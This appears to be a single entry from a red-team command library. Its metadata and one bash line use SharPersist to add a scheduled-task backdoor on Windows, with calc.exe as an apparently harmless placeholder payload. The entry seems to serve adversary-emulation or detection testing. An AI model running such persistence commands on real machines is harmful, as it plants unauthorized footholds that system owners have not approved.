---
id: d19e3b5d-7fcf-45ab-bd78-31ac25d508a4
name: Add a new persistence using SharPersist
type: command
executor: bash
data: SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe"
  -n "Something Cool" -m add
output: null
created_at: '2023-04-06T03:56:16.649575+00:00'
updated_at: '2023-04-10T20:36:23.644724+00:00'
---

# Add a new persistence using SharPersist

```bash
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```
